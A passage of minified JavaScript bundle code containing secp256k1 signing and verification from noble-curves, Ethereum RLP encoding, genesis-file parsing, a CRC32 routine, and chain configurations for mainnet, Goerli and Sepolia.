            return P > 0 ? T >> BigInt(P) : T
        }
          , W = e.bits2int_modN || function(B) {
            return d(Y(B))
        }
          , D = y0(e.nBitLength);
        function se(B) {
            if (typeof B != "bigint")
                throw new Error("bigint expected");
            if (!(Ji <= B && B < D))
                throw new Error(`bigint expected < 2^${e.nBitLength}`);
            return eo(B, e.nByteLength)
        }
        function Z(B, T, P=oe) {
            if (["recovered", "canonical"].some(vt => vt in P))
                throw new Error("sign() legacy options not supported");
            const {hash: J, randomBytes: ie} = e;
            let {lowS: R, prehash: F, extraEntropy: ne} = P;
            R == null && (R = !0),
            B = $n("msgHash", B),
            F && (B = $n("prehashed msgHash", J(B)));
            const ae = W(B)
              , re = m(T)
              , he = [se(re), se(ae)];
            if (ne != null && ne !== !1) {
                const vt = ne === !0 ? ie(n.BYTES) : ne;
                he.push($n("extraEntropy", vt))
            }
            const ye = Yl(...he)
              , ut = ae;
            function Xe(vt) {
                const Bn = Y(vt);
                if (!w(Bn))
                    return;
                const rn = p(Bn)
                  , Pt = h.BASE.multiply(Bn).toAffine()
                  , Cn = d(Pt.x);
                if (Cn === Ji)
                    return;
                const In = d(rn * d(ut + Cn * re));
                if (In === Ji)
                    return;
                let cr = (Pt.x === Cn ? 0 : 2) | Number(Pt.y & Gn)
                  , js = In;
                return R && S(In) && (js = _(In),
                cr ^= 1),
                new b(Cn,js,cr)
            }
            return {
                seed: ye,
                k2sig: Xe
            }
        }
        const oe = {
            lowS: e.lowS,
            prehash: !1
        }
          , le = {
            lowS: e.lowS,
            prehash: !1
        };
        function ve(B, T, P=oe) {
            const {seed: J, k2sig: ie} = Z(B, T, P)
              , R = e;
            return Ow(R.hash.outputLen, R.nByteLength, R.hmac)(J, ie)
        }
        h.BASE._setWindowSize(8);
        function ze(B, T, P, J=le) {
            const ie = B;
            if (T = $n("msgHash", T),
            P = $n("publicKey", P),
            "strict"in J)
                throw new Error("options.strict was renamed to lowS");
            const {lowS: R, prehash: F} = J;
            let ne, ae;
            try {
                if (typeof ie == "string" || Ms(ie))
                    try {
                        ne = b.fromDER(ie)
                    } catch (Pt) {
                        if (!(Pt instanceof gs.Err))
                            throw Pt;
                        ne = b.fromCompact(ie)
                    }
                else if (typeof ie == "object" && typeof ie.r == "bigint" && typeof ie.s == "bigint") {
                    const {r: Pt, s: Cn} = ie;
                    ne = new b(Pt,Cn)
                } else
                    throw new Error("PARSE");
                ae = h.fromHex(P)
            } catch (Pt) {
                if (Pt.message === "PARSE")
                    throw new Error("signature must be Signature instance, Uint8Array or hex string");
                return !1
            }
            if (R && ne.hasHighS())
                return !1;
            F && (T = e.hash(T));
            const {r: re, s: he} = ne
              , ye = W(T)
              , ut = p(he)
              , Xe = d(ye * ut)
              , vt = d(re * ut)
              , Bn = h.BASE.multiplyAndAddUnsafe(ae, Xe, vt)?.toAffine();
            return Bn ? d(Bn.x) === re : !1
        }
        return {
            CURVE: e,
            getPublicKey: O,
            getSharedSecret: L,
            sign: ve,
            verify: ze,
            ProjectivePoint: h,
            Signature: b,
            utils: I
        }
    }
    /*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */
    function WI(t) {
        return {
            hash: t,
            hmac: (e, ...n) => f0(t, e, nd(...n)),
            randomBytes: I1
        }
    }
    function e3(t, e) {
        const n = s => $I({
            ...t,
            ...WI(s)
        });
        return Object.freeze({
            ...n(e),
            create: n
        })
    }
    /*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */
    const Uw = BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f")
      , IA = BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141")
      , t3 = BigInt(1)
      , hp = BigInt(2)
      , kA = (t, e) => (t + e / hp) / e;
    function n3(t) {
        const e = Uw
          , n = BigInt(3)
          , s = BigInt(6)
          , o = BigInt(11)
          , l = BigInt(22)
          , u = BigInt(23)
          , d = BigInt(44)
          , p = BigInt(88)
          , h = t * t * t % e
          , m = h * h * t % e
          , y = Hn(m, n, e) * m % e
          , w = Hn(y, n, e) * m % e
          , E = Hn(w, hp, e) * h % e
          , S = Hn(E, o, e) * E % e
          , _ = Hn(S, l, e) * S % e
          , x = Hn(_, d, e) * _ % e
          , b = Hn(x, p, e) * x % e
          , I = Hn(b, d, e) * _ % e
          , O = Hn(I, n, e) * m % e
          , z = Hn(O, u, e) * S % e
          , L = Hn(z, s, e) * h % e
          , Y = Hn(L, hp, e);
        if (!mp.eql(mp.sqr(Y), t))
            throw new Error("Cannot find square root");
        return Y
    }
    const mp = qI(Uw, void 0, void 0, {
        sqrt: n3
    })
      , v0 = e3({
        a: BigInt(0),
        b: BigInt(7),
        Fp: mp,
        n: IA,
        Gx: BigInt("55066263022277343669578718895168534326250603453777594175500187360389116729240"),
        Gy: BigInt("32670510020758816978083085130507043184471273380659243275938904335757337482424"),
        h: BigInt(1),
        lowS: !0,
        endo: {
            beta: BigInt("0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"),
            splitScalar: t => {
                const e = IA
                  , n = BigInt("0x3086d221a7d46bcde86c90e49284eb15")
                  , s = -t3 * BigInt("0xe4437ed6010e88286f547fa90abfe4c3")
                  , o = BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8")
                  , l = n
                  , u = BigInt("0x100000000000000000000000000000000")
                  , d = kA(l * t, e)
                  , p = kA(-s * t, e);
                let h = un(t - d * n - p * o, e)
                  , m = un(-d * s - p * l, e);
                const y = h > u
                  , w = m > u;
                if (y && (h = e - h),
                w && (m = e - m),
                h > u || m > u)
                    throw new Error("splitScalar: Endomorphism failed, k=" + t);
                return {
                    k1neg: y,
                    k1: h,
                    k2neg: w,
                    k2: m
                }
            }
        }
    }, Xd);
    BigInt(0);
    v0.ProjectivePoint;
    const i3 = Object.freeze(Object.defineProperty({
        __proto__: null,
        secp256k1: v0
    }, Symbol.toStringTag, {
        value: "Module"
    }));
    var Pm;
    const ar = (Pm = v0) !== null && Pm !== void 0 ? Pm : i3
      , OA = BigInt("0xffffffffffffffff")
      , Zl = BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
      , r3 = ar.CURVE.n
      , s3 = r3 / BigInt(2)
      , a3 = {
        type: "object",
        required: ["crypto", "id", "version", "address"],
        properties: {
            crypto: {
                type: "object",
                required: ["cipher", "ciphertext", "cipherparams", "kdf", "kdfparams", "mac"],
                properties: {
                    cipher: {
                        type: "string"
                    },
                    ciphertext: {
                        type: "string"
                    },
                    cipherparams: {
                        type: "object"
                    },
                    kdf: {
                        type: "string"
                    },
                    kdfparams: {
                        type: "object"
                    },
                    salt: {
                        type: "string"
                    },
                    mac: {
                        type: "string"
                    }
                }
            },
            id: {
                type: "string"
            },
            version: {
                type: "number"
            },
            address: {
                type: "string"
            }
        }
    };
    var bd;
    (function(t) {
        t[t.Mainnet = 1] = "Mainnet",
        t[t.Goerli = 5] = "Goerli",
        t[t.Sepolia = 11155111] = "Sepolia"
    }
    )(bd || (bd = {}));
    var ot;
    (function(t) {
        t.Chainstart = "chainstart",
        t.Homestead = "homestead",
        t.Dao = "dao",
        t.TangerineWhistle = "tangerineWhistle",
        t.SpuriousDragon = "spuriousDragon",
        t.Byzantium = "byzantium",
        t.Constantinople = "constantinople",
        t.Petersburg = "petersburg",
        t.Istanbul = "istanbul",
        t.MuirGlacier = "muirGlacier",
        t.Berlin = "berlin",
        t.London = "london",
        t.ArrowGlacier = "arrowGlacier",
        t.GrayGlacier = "grayGlacier",
        t.MergeForkIdTransition = "mergeForkIdTransition",
        t.Merge = "merge",
        t.Shanghai = "shanghai",
        t.ShardingForkDev = "shardingFork"
    }
    )(ot || (ot = {}));
    var NA;
    (function(t) {
        t.ProofOfStake = "pos",
        t.ProofOfWork = "pow",
        t.ProofOfAuthority = "poa"
    }
    )(NA || (NA = {}));
    var MA;
    (function(t) {
        t.Ethash = "ethash",
        t.Clique = "clique",
        t.Casper = "casper"
    }
    )(MA || (MA = {}));
    var Vt;
    (function(t) {
        t.PolygonMainnet = "polygon-mainnet",
        t.PolygonMumbai = "polygon-mumbai",
        t.ArbitrumRinkebyTestnet = "arbitrum-rinkeby-testnet",
        t.ArbitrumOne = "arbitrum-one",
        t.xDaiChain = "x-dai-chain",
        t.OptimisticKovan = "optimistic-kovan",
        t.OptimisticEthereum = "optimistic-ethereum"
    }
    )(Vt || (Vt = {}));
    var qn;
    (function(t) {
        t[t.Number = 0] = "Number",
        t[t.BigInt = 1] = "BigInt",
        t[t.Uint8Array = 2] = "Uint8Array",
        t[t.PrefixedHexString = 3] = "PrefixedHexString"
    }
    )(qn || (qn = {}));
    const jw = t => {
        if (typeof t != "string")
            throw new Error(`[stripHexPrefix] input must be type 'string', received ${typeof t}`);
        return Jp(t) ? t.slice(2) : t
    }
    ;
    function o3(t) {
        return !t || t === "0x0" ? "0x0000000000000000" : Jp(t) ? `0x${jw(t).padStart(16, "0")}` : `0x${t.padStart(16, "0")}`
    }
    const Pw = function(t) {
        if (!Number.isSafeInteger(t) || t < 0)
            throw new Error(`Received an invalid integer type: ${t}`);
        return `0x${t.toString(16)}`
    };
    function l3(t, e=!0) {
        var n, s;
        const {name: o, config: l, difficulty: u, mixHash: d, gasLimit: p, coinbase: h, baseFeePerGas: m} = t;
        let {extraData: y, timestamp: w, nonce: E} = t;
        const S = Number(w)
          , {chainId: _} = l;
        if (y === "" && (y = "0x"),
        Jp(w) || (w = Pw(parseInt(w))),
        E.length !== 18 && (E = o3(E)),
        l.eip155Block !== l.eip158Block)
            throw new Error("EIP155 block number must equal EIP 158 block number since both are part of SpuriousDragon hardfork and the client only supports activating the full hardfork");
        const x = {
            name: o,
            chainId: _,
            networkId: _,
            genesis: {
                timestamp: w,
                gasLimit: parseInt(p),
                difficulty: parseInt(u),
                nonce: E,
                extraData: y,
                mixHash: d,
                coinbase: h,
                baseFeePerGas: m
            },
            hardfork: void 0,
            hardforks: [],
            bootstrapNodes: [],
            consensus: l.clique !== void 0 ? {
                type: "poa",
                algorithm: "clique",
                clique: {
                    period: (n = l.clique.period) !== null && n !== void 0 ? n : l.clique.blockperiodseconds,
                    epoch: (s = l.clique.epoch) !== null && s !== void 0 ? s : l.clique.epochlength
                }
            } : {
                type: "pow",
                algorithm: "ethash",
                ethash: {}
            }
        }
          , b = {
            [ot.Homestead]: {
                name: "homesteadBlock"
            },
            [ot.Dao]: {
                name: "daoForkBlock"
            },
            [ot.TangerineWhistle]: {
                name: "eip150Block"
            },
            [ot.SpuriousDragon]: {
                name: "eip155Block"
            },
            [ot.Byzantium]: {
                name: "byzantiumBlock"
            },
            [ot.Constantinople]: {
                name: "constantinopleBlock"
            },
            [ot.Petersburg]: {
                name: "petersburgBlock"
            },
            [ot.Istanbul]: {
                name: "istanbulBlock"
            },
            [ot.MuirGlacier]: {
                name: "muirGlacierBlock"
            },
            [ot.Berlin]: {
                name: "berlinBlock"
            },
            [ot.London]: {
                name: "londonBlock"
            },
            [ot.MergeForkIdTransition]: {
                name: "mergeForkBlock",
                postMerge: e
            },
            [ot.Shanghai]: {
                name: "shanghaiTime",
                postMerge: !0,
                isTimestamp: !0
            },
            [ot.ShardingForkDev]: {
                name: "shardingForkTime",
                postMerge: !0,
                isTimestamp: !0
            }
        }
          , I = Object.keys(b).reduce( (L, Y) => (L[b[Y].name] = Y,
        L), {})
          , O = Object.keys(l).filter(L => I[L] !== void 0 && l[L] !== void 0 && l[L] !== null);
        if (x.hardforks = O.map(L => ({
            name: I[L],
            block: b[I[L]].isTimestamp === !0 || typeof l[L] != "number" ? null : l[L],
            timestamp: b[I[L]].isTimestamp === !0 && typeof l[L] == "number" ? l[L] : void 0
        })).filter(L => L.block !== null || L.timestamp !== void 0),
        x.hardforks.sort( (L, Y) => {
            var W, D;
            return ((W = L.block) !== null && W !== void 0 ? W : 1 / 0) - ((D = Y.block) !== null && D !== void 0 ? D : 1 / 0)
        }
        ),
        x.hardforks.sort( (L, Y) => {
            var W, D;
            return ((W = L.timestamp) !== null && W !== void 0 ? W : S) - ((D = Y.timestamp) !== null && D !== void 0 ? D : S)
        }
        ),
        l.terminalTotalDifficulty !== void 0) {
            const L = {
                name: ot.Merge,
                ttd: l.terminalTotalDifficulty,
                block: null
            }
              , Y = x.hardforks.findIndex(W => {
                var D;
                return ((D = b[W.name]) === null || D === void 0 ? void 0 : D.postMerge) === !0
            }
            );
            Y !== -1 ? x.hardforks.splice(Y, 0, L) : x.hardforks.push(L)
        }
        const z = x.hardforks.length > 0 ? x.hardforks.slice(-1)[0] : void 0;
        return x.hardfork = z?.name,
        x.hardforks.unshift({
            name: ot.Chainstart,
            block: 0
        }),
        x
    }
    function c3(t, e, n) {
        try {
            if (["config", "difficulty", "gasLimit", "alloc"].some(s => !(s in t)))
                throw new Error("Invalid format, expected geth genesis fields missing");
            return e !== void 0 && (t.name = e),
            l3(t, n)
        } catch (s) {
            throw new Error(`Error parsing parameters file: ${s.message}`)
        }
    }
    function Hw(t) {
        let e = t;
        if (typeof e != "string")
            throw new Error(`[padToEven] value must be type 'string', received ${typeof e}`);
        return e.length % 2 && (e = `0${e}`),
        e
    }
    const u3 = function(t) {
        const e = Pw(t);
        return lt(`0x${Hw(e.slice(2))}`)
    }
      , ht = function(t) {
        var e;
        if (t == null)
            return new Uint8Array;
        if (t instanceof Uint8Array)
            return t;
        if (((e = t?.constructor) === null || e === void 0 ? void 0 : e.name) === "Uint8Array" || Array.isArray(t))
            return Uint8Array.from(t);
        if (typeof t == "string") {
            if (!Z1(t))
                throw new Error(`Cannot convert string to Uint8Array. only supports 0x-prefixed hex strings and this string was given: ${t}`);
            return lt(Hw(jw(t)))
        }
        if (typeof t == "number")
            return ht(kt(t));
        if (typeof t == "bigint") {
            if (t < BigInt(0))
                throw new Error(`Cannot convert negative bigint to Uint8Array. Given: ${t}`);
            let n = t.toString(16);
            return n.length % 2 && (n = `0${n}`),
            ht(`0x${n}`)
        }
        if (t.toArray)
            return Uint8Array.from(t.toArray());
        throw new Error("invalid type")
    };
    function rt(t) {
        const e = je(t);
        return BigInt(e === "0x" ? 0 : e)
    }
    function d3(t) {
        return ht(`0x${t.toString(16)}`)
    }
    const zw = function(t) {
        return new Uint8Array(t).fill(0)
    }
      , f3 = function(t, e, n) {
        const s = zw(e);
        return t.length < e ? (s.set(t, e - t.length),
        s) : t.subarray(-e)
    };
    function b0(t) {
        if (!Qr(t)) {
            const e = `This method only supports Uint8Array but input was: ${t}`;
            throw new Error(e)
        }
    }
    const DA = function(t, e) {
        return b0(t),
        f3(t, e)
    };
    function h3(t) {
        let e = t[0];
        for (; t.length > 0 && e.toString() === "0"; )
            t = t.slice(1),
            e = t[0];
        return t
    }
    const Ad = function(t) {
        return b0(t),
        h3(t)
    }
      , mt = t => `0x${t.toString(16)}`;
    function Fe(t) {
        return Ad(d3(t))
    }
    function m3(t, e) {
        return t === BigInt(0) || t === BigInt(1) ? t : e === void 0 ? t - BigInt(27) : t - (e * BigInt(2) + BigInt(35))
    }
    function p3(t) {
        return t === BigInt(0) || t === BigInt(1)
    }
    const A0 = function(t, e, n, s, o) {
        const l = m3(e, o);
        if (!p3(l))
            throw new Error("Invalid signature v value");
        return new ar.Signature(rt(n),rt(s)).addRecoveryBit(Number(l)).recoverPublicKey(t).toRawBytes(!1).slice(1)
    };
    function Ba(t, e) {
        if (t === null)
            return null;
        if (t === void 0)
            return;
        if (typeof t == "string" && !Z1(t))
            throw new Error(`A string must be provided with a 0x-prefix, given: ${t}`);
        if (typeof t == "number" && !Number.isSafeInteger(t))
            throw new Error("The provided number is greater than MAX_SAFE_INTEGER (please use an alternative input type)");
        const n = ht(t);
        switch (e) {
        case qn.Uint8Array:
            return n;
        case qn.BigInt:
            return rt(n);
        case qn.Number:
            {
                const s = rt(n);
                if (s > BigInt(Number.MAX_SAFE_INTEGER))
                    throw new Error("The provided number is greater than MAX_SAFE_INTEGER (please use an alternative output type)");
                return Number(s)
            }
        case qn.PrefixedHexString:
            return je(n);
        default:
            throw new Error("unknown outputType")
        }
    }
    var Jn = {}, LA;
    function g3() {
        if (LA)
            return Jn;
        LA = 1,
        Object.defineProperty(Jn, "__esModule", {
            value: !0
        }),
        Jn.RLP = Jn.utils = Jn.decode = Jn.encode = void 0;
        function t(b) {
            if (Array.isArray(b)) {
                const O = [];
                let z = 0;
                for (let L = 0; L < b.length; L++) {
                    const Y = t(b[L]);
                    O.push(Y),
                    z += Y.length
                }
                return m(s(z, 192), ...O)
            }
            const I = x(b);
            return I.length === 1 && I[0] < 128 ? I : m(s(I.length, 128), I)
        }
        Jn.encode = t;
        function e(b, I, O) {
            if (O > b.length)
                throw new Error("invalid RLP (safeSlice): end slice of Uint8Array out-of-bounds");
            return b.slice(I, O)
        }
        function n(b) {
            if (b[0] === 0)
                throw new Error("invalid RLP: extra zeros");
            return p(d(b))
        }
        function s(b, I) {
            if (b < 56)
                return Uint8Array.from([b + I]);
            const O = w(b)
              , z = O.length / 2
              , L = w(I + 55 + z);
            return Uint8Array.from(h(L + O))
        }
        function o(b, I=!1) {
            if (typeof b > "u" || b === null || b.length === 0)
                return Uint8Array.from([]);
            const O = x(b)
              , z = l(O);
            if (I)
                return z;
            if (z.remainder.length !== 0)
                throw new Error("invalid RLP: remainder must be zero");
            return z.data
        }
        Jn.decode = o;
        function l(b) {
            let I, O, z, L, Y;
            const W = []
              , D = b[0];
            if (D <= 127)
                return {
                    data: b.slice(0, 1),
                    remainder: b.slice(1)
                };
            if (D <= 183) {
                if (I = D - 127,
                D === 128 ? z = Uint8Array.from([]) : z = e(b, 1, I),
                I === 2 && z[0] < 128)
                    throw new Error("invalid RLP encoding: invalid prefix, single byte < 0x80 are not prefixed");
                return {
                    data: z,
                    remainder: b.slice(I)
                }
            } else if (D <= 191) {
                if (O = D - 182,
                b.length - 1 < O)
                    throw new Error("invalid RLP: not enough bytes for string length");
                if (I = n(e(b, 1, O)),
                I <= 55)
                    throw new Error("invalid RLP: expected string length to be greater than 55");
                return z = e(b, O, I + O),
                {
                    data: z,
                    remainder: b.slice(I + O)
                }
            } else if (D <= 247) {
                for (I = D - 191,
                L = e(b, 1, I); L.length; )
                    Y = l(L),
                    W.push(Y.data),
                    L = Y.remainder;
                return {
                    data: W,
                    remainder: b.slice(I)
                }
            } else {
                if (O = D - 246,
                I = n(e(b, 1, O)),
                I < 56)
                    throw new Error("invalid RLP: encoded list too short");
                const se = O + I;
                if (se > b.length)
                    throw new Error("invalid RLP: total length is larger than the data");
                for (L = e(b, O, se); L.length; )
                    Y = l(L),
                    W.push(Y.data),
                    L = Y.remainder;
                return {
                    data: W,
                    remainder: b.slice(se)
                }
            }
        }
        const u = Array.from({
            length: 256
        }, (b, I) => I.toString(16).padStart(2, "0"));
        function d(b) {
            let I = "";
            for (let O = 0; O < b.length; O++)
                I += u[b[O]];
            return I
        }
        function p(b) {
            const I = Number.parseInt(b, 16);
            if (Number.isNaN(I))
                throw new Error("Invalid byte sequence");
            return I
        }
        function h(b) {
            if (typeof b != "string")
                throw new TypeError("hexToBytes: expected string, got " + typeof b);
            if (b.length % 2)
                throw new Error("hexToBytes: received invalid unpadded hex");
            const I = new Uint8Array(b.length / 2);
            for (let O = 0; O < I.length; O++) {
                const z = O * 2;
                I[O] = p(b.slice(z, z + 2))
            }
            return I
        }
        function m(...b) {
            if (b.length === 1)
                return b[0];
            const I = b.reduce( (z, L) => z + L.length, 0)
              , O = new Uint8Array(I);
            for (let z = 0, L = 0; z < b.length; z++) {
                const Y = b[z];
                O.set(Y, L),
                L += Y.length
            }
            return O
        }
        function y(b) {
            return new TextEncoder().encode(b)
        }
        function w(b) {
            if (b < 0)
                throw new Error("Invalid integer as argument, must be unsigned!");
            const I = b.toString(16);
            return I.length % 2 ? `0${I}` : I
        }
        function E(b) {
            return b.length % 2 ? `0${b}` : b
        }
        function S(b) {
            return b.length >= 2 && b[0] === "0" && b[1] === "x"
        }
        function _(b) {
            return typeof b != "string" ? b : S(b) ? b.slice(2) : b
        }
        function x(b) {
            if (b instanceof Uint8Array)
                return b;
            if (typeof b == "string")
                return S(b) ? h(E(_(b))) : y(b);
            if (typeof b == "number" || typeof b == "bigint")
                return b ? h(w(b)) : Uint8Array.from([]);
            if (b == null)
                return Uint8Array.from([]);
            throw new Error("toBytes: received unsupported type " + typeof b)
        }
        return Jn.utils = {
            bytesToHex: d,
            concatBytes: m,
            hexToBytes: h,
            utf8ToBytes: y
        },
        Jn.RLP = {
            encode: t,
            decode: o
        },
        Jn
    }
    var Fn = g3()
      , Hm = {};
    /*! crc32.js (C) 2014-present SheetJS -- http://sheetjs.com */
    var UA;
    function y3() {
        return UA || (UA = 1,
        function(t) {
            (function(e) {
                e(typeof DO_NOT_EXPORT_CRC > "u" ? t : {})
            }
            )(function(e) {
                e.version = "1.2.2";
                function n() {
                    for (var D = 0, se = new Array(256), Z = 0; Z != 256; ++Z)
                        D = Z,
                        D = D & 1 ? -306674912 ^ D >>> 1 : D >>> 1,
                        D = D & 1 ? -306674912 ^ D >>> 1 : D >>> 1,
                        D = D & 1 ? -306674912 ^ D >>> 1 : D >>> 1,
                        D = D & 1 ? -306674912 ^ D >>> 1 : D >>> 1,
                        D = D & 1 ? -306674912 ^ D >>> 1 : D >>> 1,
                        D = D & 1 ? -306674912 ^ D >>> 1 : D >>> 1,
                        D = D & 1 ? -306674912 ^ D >>> 1 : D >>> 1,
                        D = D & 1 ? -306674912 ^ D >>> 1 : D >>> 1,
                        se[Z] = D;
                    return typeof Int32Array < "u" ? new Int32Array(se) : se
                }
                var s = n();
                function o(D) {
                    var se = 0
                      , Z = 0
                      , oe = 0
                      , le = typeof Int32Array < "u" ? new Int32Array(4096) : new Array(4096);
                    for (oe = 0; oe != 256; ++oe)
                        le[oe] = D[oe];
                    for (oe = 0; oe != 256; ++oe)
                        for (Z = D[oe],
                        se = 256 + oe; se < 4096; se += 256)
                            Z = le[se] = Z >>> 8 ^ D[Z & 255];
                    var ve = [];
                    for (oe = 1; oe != 16; ++oe)
                        ve[oe - 1] = typeof Int32Array < "u" ? le.subarray(oe * 256, oe * 256 + 256) : le.slice(oe * 256, oe * 256 + 256);
                    return ve
                }
                var l = o(s)
                  , u = l[0]
                  , d = l[1]
                  , p = l[2]
                  , h = l[3]
                  , m = l[4]
                  , y = l[5]
                  , w = l[6]
                  , E = l[7]
                  , S = l[8]
                  , _ = l[9]
                  , x = l[10]
                  , b = l[11]
                  , I = l[12]
                  , O = l[13]
                  , z = l[14];
                function L(D, se) {
                    for (var Z = se ^ -1, oe = 0, le = D.length; oe < le; )
                        Z = Z >>> 8 ^ s[(Z ^ D.charCodeAt(oe++)) & 255];
                    return ~Z
                }
                function Y(D, se) {
                    for (var Z = se ^ -1, oe = D.length - 15, le = 0; le < oe; )
                        Z = z[D[le++] ^ Z & 255] ^ O[D[le++] ^ Z >> 8 & 255] ^ I[D[le++] ^ Z >> 16 & 255] ^ b[D[le++] ^ Z >>> 24] ^ x[D[le++]] ^ _[D[le++]] ^ S[D[le++]] ^ E[D[le++]] ^ w[D[le++]] ^ y[D[le++]] ^ m[D[le++]] ^ h[D[le++]] ^ p[D[le++]] ^ d[D[le++]] ^ u[D[le++]] ^ s[D[le++]];
                    for (oe += 15; le < oe; )
                        Z = Z >>> 8 ^ s[(Z ^ D[le++]) & 255];
                    return ~Z
                }
                function W(D, se) {
                    for (var Z = se ^ -1, oe = 0, le = D.length, ve = 0, ze = 0; oe < le; )
                        ve = D.charCodeAt(oe++),
                        ve < 128 ? Z = Z >>> 8 ^ s[(Z ^ ve) & 255] : ve < 2048 ? (Z = Z >>> 8 ^ s[(Z ^ (192 | ve >> 6 & 31)) & 255],
                        Z = Z >>> 8 ^ s[(Z ^ (128 | ve & 63)) & 255]) : ve >= 55296 && ve < 57344 ? (ve = (ve & 1023) + 64,
                        ze = D.charCodeAt(oe++) & 1023,
                        Z = Z >>> 8 ^ s[(Z ^ (240 | ve >> 8 & 7)) & 255],
                        Z = Z >>> 8 ^ s[(Z ^ (128 | ve >> 2 & 63)) & 255],
                        Z = Z >>> 8 ^ s[(Z ^ (128 | ze >> 6 & 15 | (ve & 3) << 4)) & 255],
                        Z = Z >>> 8 ^ s[(Z ^ (128 | ze & 63)) & 255]) : (Z = Z >>> 8 ^ s[(Z ^ (224 | ve >> 12 & 15)) & 255],
                        Z = Z >>> 8 ^ s[(Z ^ (128 | ve >> 6 & 63)) & 255],
                        Z = Z >>> 8 ^ s[(Z ^ (128 | ve & 63)) & 255]);
                    return ~Z
                }
                e.table = s,
                e.bstr = L,
                e.buf = Y,
                e.str = W
            })
        }(Hm)),
        Hm
    }
    var v3 = y3();
    const b3 = jp(v3)
      , A3 = {
        name: "goerli",
        chainId: 5,
        networkId: 5,
        defaultHardfork: "merge",
        consensus: {
            type: "poa",
            algorithm: "clique",
            clique: {
                period: 15,
                epoch: 3e4
            }
        },
        comment: "Cross-client PoA test network",
        url: "https://github.com/goerli/testnet",
        genesis: {
            timestamp: "0x5c51a607",
            gasLimit: 10485760,
            difficulty: 1,
            nonce: "0x0000000000000000",
            extraData: "0x22466c6578692069732061207468696e6722202d204166726900000000000000e0a2bd4258d2768837baa26a28fe71dc079f84c70000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
        },
        hardforks: [{
            name: "chainstart",
            block: 0,
            forkHash: "0xa3f5ab08"
        }, {
            name: "homestead",
            block: 0,
            forkHash: "0xa3f5ab08"
        }, {
            name: "tangerineWhistle",
            block: 0,
            forkHash: "0xa3f5ab08"
        }, {
            name: "spuriousDragon",
            block: 0,
            forkHash: "0xa3f5ab08"
        }, {
            name: "byzantium",
            block: 0,
            forkHash: "0xa3f5ab08"
        }, {
            name: "constantinople",
            block: 0,
            forkHash: "0xa3f5ab08"
        }, {
            name: "petersburg",
            block: 0,
            forkHash: "0xa3f5ab08"
        }, {
            name: "istanbul",
            block: 1561651,
            forkHash: "0xc25efa5c"
        }, {
            name: "berlin",
            block: 4460644,
            forkHash: "0x757a1c47"
        }, {
            name: "london",
            block: 5062605,
            forkHash: "0xb8c6299d"
        }, {
            "//_comment": "The forkHash will remain same as mergeForkIdTransition is post merge, terminal block: https://goerli.etherscan.io/block/7382818",
            name: "merge",
            ttd: "10790000",
            block: 7382819,
            forkHash: "0xb8c6299d"
        }, {
            name: "mergeForkIdTransition",
            block: null,
            forkHash: null
        }, {
            name: "shanghai",
            block: null,
            forkHash: null
        }],
        bootstrapNodes: [],
        dnsNetworks: ["enrtree://AKA3AM6LPBYEUDMVNU3BSVQJ5AD45Y7YPOHJLEF6W26QOE4VTUDPE@all.goerli.ethdisco.net"]
    }
      , w3 = {
        name: "mainnet",
        chainId: 1,
        networkId: 1,
        defaultHardfork: "merge",
        consensus: {
            type: "pow",
            algorithm: "ethash",
            ethash: {}
        },
        comment: "The Ethereum main chain",
        url: "https://ethstats.net/",
        genesis: {
            gasLimit: 5e3,
            difficulty: 17179869184,
            nonce: "0x0000000000000042",
            extraData: "0x11bbe8db4e347b4e8c937c1c8370e4b5ed33adb3db69cbdb7a38e1e50b1b82fa"
        },
        hardforks: [{
            name: "chainstart",
            block: 0,
            forkHash: "0xfc64ec04"
        }, {
            name: "homestead",
            block: 115e4,
            forkHash: "0x97c2c34c"
        }, {
            name: "dao",
            block: 192e4,
            forkHash: "0x91d1f948"
        }, {
            name: "tangerineWhistle",
            block: 2463e3,
            forkHash: "0x7a64da13"
        }, {
            name: "spuriousDragon",
            block: 2675e3,
            forkHash: "0x3edd5b10"
        }, {
            name: "byzantium",
            block: 437e4,
            forkHash: "0xa00bc324"
        }, {
            name: "constantinople",
            block: 728e4,
            forkHash: "0x668db0af"
        }, {
            name: "petersburg",
            block: 728e4,
            forkHash: "0x668db0af"
        }, {
            name: "istanbul",
            block: 9069e3,
            forkHash: "0x879d6e30"
        }, {
            name: "muirGlacier",
            block: 92e5,
            forkHash: "0xe029e991"
        }, {
            name: "berlin",
            block: 12244e3,
            forkHash: "0x0eb440f6"
        }, {
            name: "london",
            block: 12965e3,
            forkHash: "0xb715077d"
        }, {
            name: "arrowGlacier",
            block: 13773e3,
            forkHash: "0x20c327fc"
        }, {
            name: "grayGlacier",
            block: 1505e4,
            forkHash: "0xf0afd0e3"
        }, {
            "//_comment": "The forkHash will remain same as mergeForkIdTransition is post merge, terminal block: https://etherscan.io/block/15537393",
            name: "merge",
            ttd: "58750000000000000000000",
            block: 15537394,
            forkHash: "0xf0afd0e3"
        }, {
            name: "mergeForkIdTransition",
            block: null,
            forkHash: null
        }, {
            name: "shanghai",
            block: null,
            forkHash: null
        }],
        bootstrapNodes: [],
        dnsNetworks: ["enrtree://AKA3AM6LPBYEUDMVNU3BSVQJ5AD45Y7YPOHJLEF6W26QOE4VTUDPE@all.mainnet.ethdisco.net"]
    }
      , _3 = {
        name: "sepolia",
        chainId: 11155111,
        networkId: 11155111,
        defaultHardfork: "merge",
        consensus: {
            type: "pow",
            algorithm: "ethash",
            ethash: {}
        },
        comment: "PoW test network to replace Ropsten",
        url: "https://github.com/ethereum/go-ethereum/pull/23730",
        genesis: {
            timestamp: "0x6159af19",
            gasLimit: 3e7,
            difficulty: 131072,
            nonce: "0x0000000000000000",
            extraData: "0x5365706f6c69612c20417468656e732c204174746963612c2047726565636521"
        },
        hardforks: [{
            name: "chainstart",
            block: 0,
            forkHash: "0xfe3366e7"
        }, {
            name: "homestead",
            block: 0,
            forkHash: "0xfe3366e7"
        }, {
            name: "tangerineWhistle",
            block: 0,
            forkHash: "0xfe3366e7"
        }, {
            name: "spuriousDragon",
            block: 0,
            forkHash: "0xfe3366e7"
        }, {
            name: "byzantium",
            block: 0,
